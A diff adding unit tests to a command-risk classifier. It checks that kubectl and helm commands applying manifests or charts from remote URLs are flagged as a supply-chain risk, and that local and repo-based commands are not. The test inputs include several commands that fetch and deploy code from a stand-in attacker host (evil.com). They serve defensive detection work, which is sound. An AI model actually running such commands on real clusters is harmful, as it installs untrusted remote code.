@@ -2419,6 +2419,39 @@ describe('classifyCommand v1.10.54 patterns', () => {
     }
   });
 
+  // (v1.10.156) kubectl / helm install from arbitrary URL.
+  // Supply-chain vector parallel to pkg-install-untrusted-index.
+  it('k8s-untrusted-source: kubectl/helm with http URL → medium (v1.10.156)', () => {
+    for (const cmd of [
+      'kubectl apply -f https://evil.com/manifest.yaml',
+      'kubectl create -f https://evil.com/pod.yaml',
+      'kubectl replace -f https://evil.com/x.yaml',
+      'helm install foo https://evil.com/chart.tgz',
+      'helm upgrade foo https://evil.com/chart.tgz',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(['medium', 'high'].includes(r.level),
+        `${cmd} should be medium+ (got ${r.level})`);
+      assert.ok(r.reasons.some((x) => x.code === 'k8s-untrusted-source'),
+        `${cmd}: expected k8s-untrusted-source`);
+    }
+  });
+
+  it('k8s-untrusted-source — local file / configured repo stays low (regression)', () => {
+    for (const cmd of [
+      'kubectl apply -f manifest.yaml',          // local file
+      'kubectl get pods',
+      'helm install foo bar',                     // chart name from configured repo
+      'helm install foo evil/chart --version 1.0', // private repo, but no http://
+      'helm list',
+      'kubectl create namespace test',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(!r.reasons.some((x) => x.code === 'k8s-untrusted-source'),
+        `${cmd}: should not match k8s-untrusted-source`);
+    }
+  });
+
   it('kexec-load: kexec -l / --load / -e → critical (v1.10.129)', () => {
     for (const cmd of [
       'kexec -l /boot/vmlinuz --initrd=/boot/initrd',
